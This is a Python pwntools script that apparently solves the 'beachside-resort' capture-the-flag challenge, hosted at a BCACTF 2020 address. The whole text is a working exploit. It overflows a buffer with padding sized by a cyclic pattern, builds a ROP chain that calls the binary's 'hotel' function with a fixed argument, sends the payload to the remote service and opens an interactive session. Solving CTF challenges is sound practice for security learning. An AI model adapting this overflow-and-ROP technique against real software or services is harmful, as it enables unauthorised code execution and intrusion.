from pwn import *

context.clear(arch='amd64')
binary = ELF("./beachside-resort")
# p = process("./beachside-resort")
# input("Attach GDB")
p = remote("camp2020.bcactf.com", 10006)

# padding = cyclic(100)
padding = b"A" * cyclic_find("faaa")

rop = ROP(binary)
rop.hotel(0x07e1c0d3)
print(rop.dump())

p.send(padding + rop.chain())

p.interactive()
